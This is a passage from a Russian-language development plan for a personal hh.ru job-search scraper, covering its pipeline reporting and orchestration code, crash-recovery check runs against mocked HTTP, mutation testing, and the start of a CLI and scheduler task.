        # Оценка не сериализуется. Описание `save_enriched` сохранил сам,
        # поэтому здесь остаётся только не уронить прогон.
        stats.degrade(PARTIAL, f"оценка вакансии {vacancy.id} не сериализуется: {error}")
        logger.error("оценка вакансии %s не сериализуется: %s", vacancy.id, error, exc_info=True)
        return False
    return True


def _canary(pending: int, unavailable: int, unreadable: int) -> None:
    """Тревога на смену вёрстки и на аварию источника — спека §9.

    Порог «больше половины» ловит проблему в тот же день, а не через месяц
    по пустым отчётам. Две причины разведены, потому что лечатся они
    по-разному: вёрстку правит разработчик, аварию — время.
    """
    if not pending:
        return
    if unreadable * 2 > pending:
        logger.error(
            "не разобрано %d страниц вакансий из %d — вероятно, hh.ru сменил вёрстку "
            "страницы вакансии или разметку JSON-LD",
            unreadable,
            pending,
        )
    if unavailable * 2 > pending:
        logger.error(
            "не получено %d страниц вакансий из %d — похоже, источник недоступен; "
            "попытки не израсходованы, очередь сохранена до следующего прогона",
            unavailable,
            pending,
        )


def rescore(repo: SqliteRepository, scorer: Scorer, stats: RunStats) -> int:
    """Шаг 6: локальный пересчёт оценок. Сеть не задействуется.

    Обслуживает две очереди сразу: вакансии, у которых оценка не
    посчиталась при обогащении (`save_description` выше), и те, у которых
    оценку обнулил карантин, прочитав её как испорченную.
    """
    rescored = 0
    for vacancy, details in repo.pending_scoring():
        try:
            repo.save_score(vacancy.id, scorer.score(vacancy, details))
        except Exception as error:  # noqa: BLE001 — одна вакансия не роняет прогон
            stats.degrade(PARTIAL, f"оценка вакансии {vacancy.id} не пересчиталась: {error}")
            logger.error(
                "оценка вакансии %s не пересчиталась: %s", vacancy.id, error, exc_info=True
            )
            continue
        rescored += 1
    return rescored
```

- [ ] **Step 7: Реализовать `hh_search/pipeline/reporting.py`**

```python
"""Шаг 7: отправка готового в приёмники (спека §4.1, §5.2).

Порядок здесь важнее кода. Карантин срабатывает ВНУТРИ `unreported()`:
нечитаемая оценка обнуляется именно в момент чтения, и вакансия уходит в
`pending_scoring`. Значит один вызов `unreported()` не может вернуть то,
что он же только что отправил на пересчёт, — а лечение обязано занимать
один прогон, не два. Отсюда два прохода `пересчёт → unreported()`:

* первый разгребает очередь, которую мог создать сам шаг обогащения
  (`save_description` при отказе оценки), и читает готовое;
* второй досчитывает то, что карантин обнулил во время этого чтения.

Двух проходов ДОСТАТОЧНО и это доказуемо: записать оценку, которая не
читается обратно, нельзя — `ScoreBreakdown` запрещает `inf`/`nan` на
входе, поэтому пересчитанная оценка не может снова уйти в карантин.
"""

import logging
from collections.abc import Sequence
from datetime import datetime

from hh_search.domain.models import ScoredVacancy
from hh_search.pipeline.enrichment import rescore
from hh_search.pipeline.stats import FAILED, PARTIAL, RunStats
from hh_search.scoring.base import Scorer
from hh_search.sinks.base import Sink
from hh_search.storage.repository import SqliteRepository

logger = logging.getLogger(__name__)

_PASSES = 2


def report(
    repo: SqliteRepository,
    scorer: Scorer,
    sinks: Sequence[Sink],
    stats: RunStats,
    moment: datetime,
) -> None:
    ready = _collect(repo, scorer, stats)
    if not ready:
        return
    if not sinks:
        # Недостижимо через конфиг (`sinks` требует min_length=1), но
        # пометить вакансии отправленными, не отправив их никуда, — тихая
        # потеря, а такие пути в этом проекте обязаны кричать.
        stats.degrade(FAILED, "приёмников нет, отправлять некуда")
        logger.error("приёмников нет: %d вакансий остаются в очереди отправки", len(ready))
        return
    delivered, failed = _emit(sinks, ready, moment)
    if failed:
        _complain(ready, delivered, failed, stats)
        return
    repo.mark_reported([item.discovered.id for item in ready])
    stats.reported = len(ready)
    logger.info("отправлено вакансий: %d, приёмники: %s", len(ready), ", ".join(delivered))


def _collect(repo: SqliteRepository, scorer: Scorer, stats: RunStats) -> list[ScoredVacancy]:
    """Готовое к отправке — после того, как очередь пересчёта разобрана."""
    ready: list[ScoredVacancy] = []
    for _ in range(_PASSES):
        stats.rescored += rescore(repo, scorer, stats)
        ready = repo.unreported()
    # Хранилище кричит из `unreported()` о застрявших строках, но пропуск
    # шага не должен быть тихим и здесь: `stuck` уезжает в журнал прогона,
    # а id — в лог, потому что без них не понять, какие вакансии, уже
    # стоившие запроса к hh.ru, не попадут ни в один отчёт.
    stuck = repo.pending_scoring()
    stats.stuck = len(stuck)
    if stuck:
        stats.degrade(PARTIAL, f"оценка не досчитана у {len(stuck)} вакансий")
        logger.error(
            "%d вакансий с готовым описанием остались без оценки и не попадут в отчёт: %s. "
            "Описание у них есть, перекачка не нужна — нужен локальный пересчёт",
            len(stuck),
            ", ".join(vacancy.id for vacancy, _ in stuck),
        )
    return ready


def _emit(
    sinks: Sequence[Sink], ready: Sequence[ScoredVacancy], moment: datetime
) -> tuple[list[str], list[str]]:
    delivered: list[str] = []
    failed: list[str] = []
    for sink in sinks:
        try:
            sink.emit(ready, moment)
        except Exception as error:  # noqa: BLE001 — падение приёмника не теряет вакансии
            failed.append(sink.name)
            logger.error(
                "приёмник %s не принял %d вакансий: %s",
                sink.name,
                len(ready),
                error,
                exc_info=True,
            )
        else:
            delivered.append(sink.name)
    return delivered, failed


def _complain(
    ready: Sequence[ScoredVacancy], delivered: Sequence[str], failed: Sequence[str], stats: RunStats
) -> None:
    """Ни одной вакансии не помечаем отправленной — и говорим, чем платим.

    `mark_reported` только при успехе ВСЕХ приёмников защищает от потери,
    но не от повтора: следующий прогон отдаст те же вакансии заново, и
    приёмник, отработавший сейчас, увидит их второй раз. Устранить это
    внутри конвейера нечем — доставка at-least-once по построению, —
    поэтому идемпотентность по `id` остаётся обязанностью приёмника, а
    здесь обязателен громкий лог и понижение статуса: молча задваивать
    отчёт нельзя.
    """
    stats.degrade(PARTIAL, f"приёмники не приняли отчёт: {', '.join(failed)}")
    logger.error(
        "приёмники %s не приняли отчёт, поэтому %d вакансий остаются в очереди отправки. "
        "Следующий прогон отправит их заново, и приёмники, отработавшие сейчас (%s), "
        "увидят их повторно",
        ", ".join(failed),
        len(ready),
        ", ".join(delivered) or "ни один",
    )
```

- [ ] **Step 8: Реализовать `hh_search/pipeline/__init__.py`**

```python
"""Оркестрация семи шагов конвейера (спека §4.1).

Модуль разбит на файлы по шагам, а `run_once` здесь оставлен один и
целиком: единственное, что он знает, — ПОРЯДОК шагов и то, что журнал
прогона закрывается при любом исходе. Порядок здесь — не оформление:
сохранение идёт до отправки, отправка выбирает из базы, а не из памяти
(поэтому авария между шагами ничего не теряет), и пересчёт оценки стоит
между двумя чтениями `unreported()`, потому что карантин срабатывает
внутри чтения (см. reporting.py).

`build_sinks` вызывается ВНЕ этой функции и до неё — контракт задачи 9:
опечатка в имени приёмника обязана ронять процесс на старте, а не в
середине прогона, когда за страницы уже заплачено запросами к hh.ru.
"""

import logging
from collections.abc import Sequence
from datetime import UTC, datetime

from hh_search.config.models import Config
from hh_search.errors import AccessForbidden
from hh_search.pipeline.discovery import discover, prefilter
from hh_search.pipeline.enrichment import enrich
from hh_search.pipeline.reporting import report
from hh_search.pipeline.stats import EXIT_CODES, FAILED, OK, PARTIAL, RunStats
from hh_search.scoring.base import Scorer
from hh_search.sinks.base import Sink
from hh_search.sources.http import PoliteClient
from hh_search.storage.repository import SqliteRepository

__all__ = ["EXIT_CODES", "FAILED", "OK", "PARTIAL", "RunStats", "run_once"]

logger = logging.getLogger(__name__)


def run_once(
    config: Config,
    client: PoliteClient,
    repo: SqliteRepository,
    scorer: Scorer,
    sinks: Sequence[Sink],
    now: datetime | None = None,
) -> RunStats:
    """Один прогон целиком. Возвращает счётчики и статус, не бросает при частичном отказе.

    Наружу летит только `AccessForbidden` (спека §9: устойчивый 403 —
    остановка прогона) и ошибки программиста. Журнал прогона закрывается
    в любом случае, иначе в таблице `run` копятся строки `running`, и
    healthcheck перестаёт понимать, что происходит.
    """
    moment = now or datetime.now(UTC)
    if moment.tzinfo is None:
        # Наивная дата разъехалась бы с `reported_at`: имя файла отчёта
        # берётся отсюда, а `reported_at` пишется в UTC хранилищем — при
        # ночном прогоне это разные сутки.
        raise ValueError(f"момент прогона обязан быть aware UTC, получено {moment!r}")
    stats = RunStats()
    run_id = repo.start_run()
    try:
        discover(config, client, repo, stats)
        prefilter(config, repo, stats)
        enrich(config, client, repo, scorer, stats)
        report(repo, scorer, sinks, stats, moment)
    except AccessForbidden as error:
        stats.degrade(FAILED, f"hh.ru закрыл доступ: {error}")
        logger.error("прогон остановлен: %s. Обходные пути не применяются", error)
        repo.finish_run(run_id, stats.status, **stats.counters())
        raise
    except Exception as error:
        stats.degrade(FAILED, f"необработанная ошибка: {error}")
        logger.exception("прогон прерван необработанной ошибкой")
        repo.finish_run(run_id, stats.status, **stats.counters())
        raise
    repo.finish_run(run_id, stats.status, **stats.counters())
    logger.info(
        "прогон %s: найдено %d, новых %d, отсеяно %d, обогащено %d, пересчитано %d, "
        "без оценки %d, отправлено %d%s",
        stats.status,
        stats.discovered,
        stats.new_count,
        stats.rejected,
        stats.enriched,
        stats.rescored,
        stats.stuck,
        stats.reported,
        f", причина: {stats.error}" if stats.error else "",
    )
    return stats
```

- [ ] **Step 9: Запустить тесты, типы и линтер**

Run: `uv run pytest tests/test_pipeline.py -q && uv run mypy --strict hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/pipeline tests/test_pipeline.py`
Expected: `23 passed`, `Success: no issues found`, `All checks passed!`,
`6 files already formatted`

- [ ] **Step 10: Проверочные прогоны — то, чего pytest не видит**

Три Critical этой задачи ревьюер нашёл не тестами, а прогонами. Их обязательно выполнить
руками: `pytest` проверяет ожидания, а эти три проверки проверяют ФАКТЫ — число запросов к
источнику, целость данных после убийства процесса и то, что сервис не ослеп.

Создать **временный** `check_pipeline.py` в корне (в репозиторий он НЕ коммитится):

```python
"""Три проверочных прогона, которых не делает pytest. Скрипт временный.

Запуск: `uv run python check_pipeline.py /tmp/hh-check [crash <каталог> <точка>]`
"""

import gzip
import json
import os
import subprocess
import sys
from collections import Counter
from collections.abc import Sequence
from datetime import datetime
from pathlib import Path

import httpx

from hh_search.config.loader import load_config
from hh_search.config.models import Config
from hh_search.domain.models import DiscoveredVacancy, ScoreBreakdown, ScoredVacancy, VacancyDetails
from hh_search.pipeline import RunStats, run_once
from hh_search.scoring.keyword import KeywordScorer
from hh_search.sinks.base import Sink
from hh_search.sources.http import PoliteClient
from hh_search.storage.repository import SqliteRepository

HERE = Path(__file__).parent
FIXTURES = HERE / "tests" / "fixtures"
ROBOTS = (FIXTURES / "robots_hh.txt").read_text(encoding="utf-8")
BROKEN = '<html><head><link rel="canonical" href="/vacancies/programmist"></head></html>'
CRASH_POINTS = ("после-discovery", "между-обогащением-и-оценкой", "после-сохранения", "до-отчёта")
# os._exit не исполняет ни finally, ни atexit — счётчик запросов пишется ДО
# него, иначе родитель не узнает, сколько страниц успел скачать убитый.
_COUNTER: "tuple[Path, Source] | None" = None


def die() -> None:
    if _COUNTER is not None:
        path, source = _COUNTER
        path.write_text(json.dumps(dict(source.calls)), encoding="utf-8")
    os._exit(9)


APP_YAML = """
contact_email: "me@example.com"
user_agent: "hh-search/0.1 (personal job search; {{contact_email}})"
schedule: {{interval_hours: 4}}
http: {{delay_between_requests_sec: 0.1, timeout_sec: 20, max_retries: 3, respect_robots: true}}
enrich: {{max_attempts: 3}}
sinks: [csv, markdown]
paths: {{state: {root}/state/hh.db, reports: {root}/reports, logs: {root}/logs}}
"""
PROFILE_YAML = """
weights: {title: 0.40, stack: 0.30, responsibilities: 0.20, domain: 0.10}
saturation: {stack: 5, responsibilities: 3}
penalty_per_signal: 15
signals:
  title_roles: [team lead]
  title_tech: [backend]
  stack: [yocto]
  responsibilities: [архитектур]
  domain: [телеком]
negative: [junior]
report_threshold: 60
"""
QUERIES_YAML = "queries:\n  - {slug: programmist, cluster: embedded, weight: 9, pages: 1}\n"


def unpack(name: str) -> str:
    with gzip.open(FIXTURES / name, "rt", encoding="utf-8") as handle:
        return handle.read()


class Source:
    """Подменённый транспорт: считает запросы и умеет отдавать 304."""

    def __init__(self, listing: str = "", honour_etag: bool = False) -> None:
        self.listing = listing or unpack("listing_programmist.html.gz")
        self.page = unpack("vacancy_salary.html.gz")
        self.honour_etag = honour_etag
        self.calls: Counter[str] = Counter()

    def transport(self) -> httpx.MockTransport:
        return httpx.MockTransport(self.handle)

    def handle(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if path == "/robots.txt":
            self.calls["robots"] += 1
            return httpx.Response(200, text=ROBOTS, headers={"Content-Type": "text/plain"})
        if path.startswith("/vacancies"):
            self.calls["листинг"] += 1
            if self.honour_etag and request.headers.get("If-None-Match"):
                return httpx.Response(304)
            return httpx.Response(200, text=self.listing, headers={"ETag": '"v1"'})
        self.calls["страница"] += 1
        return httpx.Response(200, text=self.page)


class CountingSink:
    name = "counting"

    def __init__(self) -> None:
        self.seen: list[str] = []

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> None:
        self.seen += [item.discovered.id for item in vacancies]


class Killer:
    """Скорер, убивающий процесс между скачиванием страницы и записью."""

    def __init__(self, profile: Config, die: bool) -> None:
        self._real = KeywordScorer(profile.profile)
        self._die = die
        self.calls = 0

    def score(self, discovered: DiscoveredVacancy, details: VacancyDetails) -> ScoreBreakdown:
        self.calls += 1
        if self._die and self.calls == 2:
            die()
        return self._real.score(discovered, details)


def make_config(root: Path) -> Config:
    config_dir = root / "config"
    config_dir.mkdir(parents=True, exist_ok=True)
    (config_dir / "app.yaml").write_text(APP_YAML.format(root=root), encoding="utf-8")
    (config_dir / "profile.yaml").write_text(PROFILE_YAML, encoding="utf-8")
    (config_dir / "queries.yaml").write_text(QUERIES_YAML, encoding="utf-8")
    return load_config(config_dir)


def one_run(config: Config, source: Source, sinks: Sequence[Sink], point: str = "") -> RunStats:
    import hh_search.pipeline as pipeline

    config.app.paths.state.parent.mkdir(parents=True, exist_ok=True)
    if point == "после-discovery":
        pipeline.prefilter = lambda *a: die()  # type: ignore[assignment, return-value]
    if point == "до-отчёта":
        pipeline.report = lambda *a: die()  # type: ignore[assignment, return-value]
    with (
        SqliteRepository(config.app.paths.state) as repo,
        PoliteClient(
            config.app.http,
            config.app.user_agent,
            sleep=lambda _: None,
            transport=source.transport(),
        ) as client,
    ):
        repo.init_schema()
        if point == "после-сохранения":
            _kill_after_save(repo)
        scorer = Killer(config, point == "между-обогащением-и-оценкой")
        return run_once(config, client, repo, scorer, sinks)


def _kill_after_save(repo: SqliteRepository) -> None:
    real = repo.save_enriched
    saved = {"n": 0}

    def save_then_die(vacancy_id: str, details: VacancyDetails, score: ScoreBreakdown) -> None:
        real(vacancy_id, details, score)
        saved["n"] += 1
        if saved["n"] == 2:
            die()

    repo.save_enriched = save_then_die  # type: ignore[method-assign]


def state(config: Config) -> str:
    raw = SqliteRepository(config.app.paths.state)
    with raw as repo:
        rows = repo.reported_since(datetime.fromisoformat("2000-01-01T00:00:00+00:00"))
        pending = repo.pending_enrichment(3)
        scoring = repo.pending_scoring()
    return f"отправлено в базе={len(rows)} ждут страницы={len(pending)} ждут оценки={len(scoring)}"


def scenario_one(root: Path) -> None:
    print("ПРОВЕРКА 1: два прогона подряд со счётчиком фактических HTTP-вызовов")
    config = make_config(root)
    source = Source()
    for number in (1, 2):
        sink = CountingSink()
        before = Counter(source.calls)
        stats = one_run(config, source, [sink])
        print(
            f"  прогон {number}: status={stats.status} discovered={stats.discovered} "
            f"new={stats.new_count} rejected={stats.rejected} enriched={stats.enriched} "
            f"reported={stats.reported}; запросы={dict(source.calls - before)}"
        )
    print(f"  ИТОГО: {dict(source.calls)}")
    print(f"  {state(config)}")


def scenario_two(root: Path) -> None:
    print("\nПРОВЕРКА 2: os._exit в четырёх точках конвейера и перезапуск")
    for point in CRASH_POINTS:
        work = root / point
        child = subprocess.run(
            [sys.executable, __file__, str(work), "crash", point], capture_output=True, text=True
        )
        spent = json.loads((work / "calls.json").read_text(encoding="utf-8"))
        config = make_config(work)
        source = Source()
        sink = CountingSink()
        stats = one_run(config, source, [sink])
        print(f"  {point}: код выхода {child.returncode}, до аварии {spent}")
        print(
            f"      прогон после аварии: status={stats.status} enriched={stats.enriched} "
            f"rescored={stats.rescored} reported={stats.reported}; "
            f"страниц скачано всего={spent.get('страница', 0) + source.calls['страница']}"
        )
        print(f"      {state(config)}")


def scenario_three(root: Path) -> None:
    print("\nПРОВЕРКА 3: обрезанная выдача, дальше источник отдаёт 304 на условный запрос")
    config = make_config(root)
    source = Source(listing=BROKEN, honour_etag=True)
    stats = one_run(config, source, [CountingSink()])
    print(f"  прогон 1 (обрезано): status={stats.status} discovered={stats.discovered}")
    source.listing = unpack("listing_programmist.html.gz")
    for number in (2, 3):
        stats = one_run(config, source, [CountingSink()])
        print(
            f"  прогон {number} (источник в порядке): status={stats.status} "
            f"discovered={stats.discovered} enriched={stats.enriched} reported={stats.reported}"
        )
    print(f"  {state(config)}")


def main() -> None:
    global _COUNTER  # noqa: PLW0603 — проверочный скрипт, не код проекта
    root = Path(sys.argv[1])
    if len(sys.argv) > 2 and sys.argv[2] == "crash":
        source = Source()
        _COUNTER = (root / "calls.json", source)
        one_run(make_config(root), source, [CountingSink()], sys.argv[3])
        return
    scenario_one(root / "one")
    scenario_two(root / "two")
    scenario_three(root / "three")


if __name__ == "__main__":
    main()
```

Run: `rm -rf /tmp/hh-check && uv run python check_pipeline.py /tmp/hh-check 2>/dev/null`
Expected (фактический вывод, числа настоящие):

```text
ПРОВЕРКА 1: два прогона подряд со счётчиком фактических HTTP-вызовов
  прогон 1: status=ok discovered=20 new=20 rejected=2 enriched=18 reported=18; запросы={'robots': 1, 'листинг': 1, 'страница': 18}
  прогон 2: status=ok discovered=20 new=0 rejected=0 enriched=0 reported=0; запросы={'robots': 1, 'листинг': 1}
  ИТОГО: {'robots': 2, 'листинг': 2, 'страница': 18}
  отправлено в базе=18 ждут страницы=0 ждут оценки=0

ПРОВЕРКА 2: os._exit в четырёх точках конвейера и перезапуск
  после-discovery: код выхода 9, до аварии {'robots': 1, 'листинг': 1}
      прогон после аварии: status=ok enriched=18 rescored=0 reported=18; страниц скачано всего=18
      отправлено в базе=18 ждут страницы=0 ждут оценки=0
  между-обогащением-и-оценкой: код выхода 9, до аварии {'robots': 1, 'листинг': 1, 'страница': 2}
      прогон после аварии: status=ok enriched=17 rescored=0 reported=18; страниц скачано всего=19
      отправлено в базе=18 ждут страницы=0 ждут оценки=0
  после-сохранения: код выхода 9, до аварии {'robots': 1, 'листинг': 1, 'страница': 2}
      прогон после аварии: status=ok enriched=16 rescored=0 reported=18; страниц скачано всего=18
      отправлено в базе=18 ждут страницы=0 ждут оценки=0
  до-отчёта: код выхода 9, до аварии {'robots': 1, 'листинг': 1, 'страница': 18}
      прогон после аварии: status=ok enriched=0 rescored=0 reported=18; страниц скачано всего=18
      отправлено в базе=18 ждут страницы=0 ждут оценки=0

ПРОВЕРКА 3: обрезанная выдача, дальше источник отдаёт 304 на условный запрос
  прогон 1 (обрезано): status=failed discovered=0
  прогон 2 (источник в порядке): status=ok discovered=20 enriched=18 reported=18
  прогон 3 (источник в порядке): status=ok discovered=0 enriched=0 reported=0
  отправлено в базе=18 ждут страницы=0 ждут оценки=0
```

Что здесь важно прочитать, а не пролистать:

- **Проверка 1.** Страница вакансии скачана 18 раз за ДВА прогона, а не 36: второй прогон
  стоит одного запроса к листингу. `discovered=20` во втором прогоне при `new=0` — это
  честно: мок отдаёт 200 (не 304), листинг перечитан, все двадцать id уже известны базе.
- **Проверка 2.** Ни одна авария не потеряла ни одной вакансии: после перезапуска отправлены
  все 18 в каждой из четырёх точек. Цена аварии между скачиванием и записью — РОВНО одна
  перекачанная страница (19 вместо 18): описание того элемента, на котором умер процесс, в
  базу не попало. Двухфазная запись это убрала бы, но она дороже одного запроса раз в
  аварию. Незакрытая строка `running` в журнале остаётся (os._exit не исполняет ни `finally`,
  ни обработчики) — `last_successful_run()` такие строки не считает, healthcheck не обманут;
  ретенция журнала — отложенный minor задачи 6.
- **Проверка 3.** Прогон 1 на обрезанной выдаче даёт `failed` (а не `partial` — иначе
  healthcheck считал бы его успехом), валидатор не сохранён, и прогон 2 находит все 20 вакансий
  несмотря на то, что мок отдаёт 304 на любой условный запрос. Прогон 3 получает 304 честно —
  выдача не менялась — и это уже законный ноль.

Удалить скрипт: `rm check_pipeline.py`

- [ ] **Step 11: Мутационная проверка — каждый тест обязан краснеть**

Восемь тестов прежней редакции проходили при полностью неработающем конвейере (один проверял
отсутствие одного URL и был зелен, даже если не скачано ни одной страницы). Чтобы это не
повторилось, каждый дефект вносится в реализацию и проверяется, что конкретный тест краснеет.
Девятнадцать мутаций, все обязаны быть убиты:

| Мутация | Кто обязан покраснеть |
|---|---|
| валидатор кэша пишется ДО разбора | `test_validator_is_not_stored_when_writing_vacancies_fails` |
| прежний валидатор не сбрасывается | `test_unparsable_listing_leaves_no_cache_validator` |
| нет агрегатного сторожа тишины | `test_run_where_no_listing_yielded_anything_is_a_failure` |
| сторож тишины срабатывает постранично | `test_one_empty_page_among_several_is_not_a_failure` |
| транспортный отказ жжёт попытку | `test_source_outage_does_not_burn_enrich_attempts` |
| отказ страницы не жжёт попытку | `test_broken_page_burns_attempts_and_ends_in_enrich_failed` |
| оценка считается без обработчика | `test_scoring_failure_keeps_the_page_and_is_loud` |
| пересчёт и чтение одним проходом | `test_score_is_recomputed_and_sent_within_one_run` |
| `mark_reported` при упавшем приёмнике | `test_partial_sink_failure_keeps_everything_unreported` |
| отказ приёмника не понижает статус | `test_partial_sink_failure_keeps_everything_unreported` |
| без приёмников вакансии помечаются отправленными | `test_run_without_sinks_marks_nothing_reported` |
| читается только первая страница листинга | `test_pages_of_one_listing_are_requested_one_by_one` |
| `SalaryBlockStats` не передаётся в разбор | `test_salary_drift_guard_is_wired_into_enrichment` |
| нет канарейки на >50% отказов | `test_more_than_half_failed_pages_raise_the_canary` |
| журнал не закрывается при 403 | `test_forbidden_stops_the_run_and_closes_the_journal` |
| наивный `now` принимается | `test_naive_moment_is_rejected` |
| счётчик обогащения присваивается в конце | `test_counters_survive_a_crash_in_the_middle` |
| остаток очереди пересчёта не перепроверяется | `test_scoring_failure_keeps_the_page_and_is_loud` |
| новыми считаются все найденные | `test_second_run_costs_one_request_and_reports_nothing` |

Проверено при переписывании плана: 19 из 19 мутантов убиты. Первая мутация из таблицы —
единственная, которая на первом заходе ВЫЖИЛА (её маскировал `reset_cache`), из-за чего в
набор добавлен отдельный тест на сам порядок записи.

- [ ] **Step 12: Прогнать весь набор**

Run: `uv run pytest -q && uv run mypy --strict hh_search tests && uv run ruff check .`
Expected: `343 passed` (281 на `f9f77bd` + 39 за задачи 7–9 + 23 здесь), `Success: no issues
found`, `All checks passed!`

- [ ] **Step 13: Коммит**

```bash
git add hh_search/pipeline hh_search/storage/repository.py hh_search/storage/run_log.py \
        tests/test_pipeline.py
git commit -m "feat: конвейер прогона

Семь шагов по спеке §4.1. Порядок значим и закреплён тестами:
валидатор условного запроса пишется ПОСЛЕ записи вакансий в базу
(иначе одна обрезанная выдача ослепляет сервис навсегда через вечный
304), сохранение идёт до отправки, а пересчёт оценки стоит между двумя
чтениями unreported() — карантин срабатывает внутри чтения, и лечение
обязано занимать один прогон, а не два.

Транспортный отказ отделён от отказа страницы: 503 и недоступный
robots.txt больше не жгут enrich_attempts, иначе двенадцать часов
недоступности hh.ru терминально выбрасывали всю очередь. Отказ скоринга
сохраняет уже скачанную страницу через save_description.

Статус прогона умеет только ухудшаться и связан с кодом возврата, а
пустой прогон при непустом списке листингов — громкий отказ, а не ok:
класс «месяцы молчания при зелёном healthcheck» закрыт агрегатным
сторожем."
```

---

### Task 11: CLI, логи и планировщик

**Files:**
- Create: `hh_search/logging_setup.py`, `hh_search/scheduler.py`, `hh_search/__main__.py`
- Edit: `hh_search/storage/repository.py` (`set_status` возвращает результат, добавляется
  `reported_since`)
- Test: `tests/test_cli.py`, `tests/test_scheduler.py`, `tests/test_repository.py`

**Interfaces:**
- Consumes: всё предыдущее
- Produces: `setup_logging(logs_dir: Path, level: int = logging.INFO) -> None`;
  `class StopSignal` (`install`, `request`, `requested`, `wait`);
  `serve(config, run, *, stop=None, monotonic=time.monotonic, iterations=None) -> int`;
  typer-приложение `app` с командами `run`, `serve`, `init-db`, `healthcheck`, `report`, `mark`;
  `repo.reported_since(cutoff) -> list[ScoredVacancy]`

Команды (спека §8.3):

- `run` — один прогон. Спека писала `run --once`, но флаг ничего не менял; отклонение
  фиксируется в Task 13. **Код возврата повторяет статус прогона**: `ok` → 0, `failed` → 1,
  `partial` → 3. Код 2 занят ошибкой конфига и аргументов — его же отдаёт click.
- `serve` — цикл по расписанию. Отказ прогона демон не роняет (иначе контейнер уходит в петлю
  перезапусков), но два `AccessForbidden` ПОДРЯД останавливают его ненулевым кодом.
- `init-db` — создать схему и догнать существующую до неё.
- `healthcheck` — 0, если последний успешный прогон свежее `2 × interval_hours`.
- `report --since 7d` — перегенерировать отчёт по уже отправленным вакансиям.
- `mark <id> <status>` — проставить статус вручную.

Общая опция `--config-dir` (по умолчанию `/data/config`, переопределяется `HH_CONFIG_DIR`).

**Что здесь переписано и почему.** Прежняя редакция была собрана и прогнана; девять дефектов
воспроизведены исполнением.

1. **`@app.callback()` грузил конфиг раньше всего.** `--help` любой подкоманды требовал
   существующего `/data/config`, а отсутствие конфига давало голый traceback. Теперь callback
   запоминает только каталог; читает его та команда, которой конфиг нужен, а ошибка чтения
   превращается в сообщение и код 2.
2. **`healthcheck` до `init-db`** падал `OperationalError` и оставлял после себя нулевой файл
   базы (`sqlite3.connect` создаёт файл молча) — а это первые секунды жизни контейнера, когда
   Docker уже дёргает HEALTHCHECK. Теперь отсутствие файла и база без схемы дают внятное
   сообщение и код 1, ничего не создавая.
3. **`serve` продолжал работу после `AccessForbidden`** — против спеки §9. Сервис, которому
   hh.ru закрыл доступ, стучался каждые четыре часа вечно, и никто не узнавал. Теперь считаются
   подряд идущие 403, и после второго демон выходит кодом 1.
4. **Расписание дрейфовало.** `sleep(interval)` ПОСЛЕ прогона добавляет к интервалу
   длительность прогона: при четырёх часах и десятиминутном прогоне сутки уносят расписание на
   два с половиной часа. Пауза считается до дедлайна.
5. **Нет обработчика SIGTERM.** Ядро не применяет диспозицию по умолчанию к PID 1, поэтому
   сигнал до процесса не доезжает: замер — `docker stop` длится все 10.2 с и завершается кодом
   137 (SIGKILL) против 0.2 с и кода 0 с обработчиком. Обработчика при этом МАЛО: по PEP 475
   прерванный `time.sleep` возобновляется, и процесс, взведя флаг, продолжал бы спать четыре
   часа. Ожидание построено на `threading.Event`.
6. **`mark 999999 applied` печатал «готово» и отдавал 0.** Теперь `set_status` возвращает
   `rowcount > 0`, а CLI проверяет и статус тоже: `set_status` его не валидирует, а вводит
   человек — опечатка увела бы вакансию в состояние, невидимое всем трём выборкам.
7. **`report --since 7days`** давал traceback. Разбор периода — регулярка, отказ — сообщение.
8. **`report` не компилировался и обходил карантин.** `reported_since` в прежней редакции не
   импортировал `json`, звал несуществующий `self._to_discovered`, тянул `SELECT v.*` без
   `CAST(... AS BLOB)` и брал запрос недетерминированным подзапросом. Факт после механической
   починки импортов: порча ОДНОЙ строки роняла выборку целиком —
   `OperationalError: Could not decode to UTF-8 column 'title'`. Команда `report` —
   единственный способ пользователя вытащить историю, она обязана переживать порчу лучше
   конвейера, а не хуже.
9. **`setup_logging` вызывался только в `run`/`serve`**, поэтому `ERROR` карантина в четырёх
   командах уходил мимо файла; `httpx` на INFO писал строку на каждый запрос, заливая ими
   единственный след потери данных.

Плюс найденное при сборке: **`run` на пустом volume падал `unable to open database file`** ещё
до `init_schema()` — каталог базы создавал только `init-db`. Порядок команд, которого нигде не
обещано. Теперь каталог создаёт и `_execute`.

- [ ] **Step 1: Правки хранилища, нужные CLI**

В `hh_search/storage/repository.py`: `set_status` возвращает `bool`, и добавляется
`reported_since` рядом с `unreported` (тем же способом чтения — `CAST(... AS BLOB)` плюс
`safe_rows`, иначе одна битая строка отнимает у пользователя всю историю):

```python
    def set_status(self, vacancy_id: str, status: str) -> bool:
        """Ручная смена статуса. `False` — такой вакансии в базе нет.

        Результат возвращается, потому что вызывающий — CLI, а id туда
        вводит человек: `mark 999999 applied` на несуществующей вакансии
        без этого печатал бы «готово» и отдавал код 0.
        """
        cursor = self._connection.execute(
            "UPDATE vacancy SET status = ? WHERE id = ?", (status, vacancy_id)
        )
        self._connection.commit()
        return cursor.rowcount > 0
```

```python
    def reported_since(self, cutoff: datetime) -> list[ScoredVacancy]:
        """Уже отправленное — для повторной генерации отчёта командой `report`.

        Читается ровно теми же средствами, что `unreported()`:
        `CAST(... AS BLOB)` плюс `safe_rows`. Без них одна испорченная
        строка роняла бы весь курсор (sqlite3 декодирует TEXT на этапе
        fetch, до того как код увидит хоть одну строку) — то есть
        единственный способ пользователя вернуть историю ломался бы от
        того, что конвейер переживает. Запрос, которым вакансия найдена,
        берётся из колонки `primary_query`, а не подзапросом по
        `vacancy_query`: подзапрос без ORDER BY недетерминирован и мог
        разойтись с кластером в том же отчёте.
        """
        rows = self._connection.execute(
            f"SELECT {_DISCOVERED_COLUMNS_SQL}, CAST(description AS BLOB) AS description, "
            "CAST(valid_through AS BLOB) AS valid_through, "
            "CAST(cluster AS BLOB) AS cluster, CAST(score_detail AS BLOB) AS score_detail "
            "FROM vacancy WHERE status = ? AND reported_at >= ? "
            "AND description IS NOT NULL AND score_detail IS NOT NULL ORDER BY score DESC",
            (STATUS_REPORTED, to_utc_iso(cutoff)),
        ).fetchall()
        return safe_rows(rows, to_scored, self._quarantine)
```

Импорт `to_utc_iso` добавить к существующему из `time_utils`.

Карантин здесь тот же, что и в конвейере, и это осознанно: строка со `status = 'reported'`
терминальна, восстанавливать её нечем (заголовка и кластера на странице вакансии нет вовсе),
